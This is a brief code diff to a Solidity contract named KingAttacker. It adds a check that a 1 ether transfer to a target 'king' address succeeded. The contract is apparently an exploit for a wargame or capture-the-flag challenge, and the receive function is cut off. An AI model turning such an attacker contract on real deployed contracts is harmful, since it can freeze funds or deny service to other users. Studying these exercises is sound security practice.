@@ -12,6 +12,7 @@ contract KingAttacker {
 
     function getCrown() public {
         (bool sent,) = kingAddress.call{value: 1 ether}("");
+        require(sent, "Your transaction failed!");
     }
 
     receive() external payable {
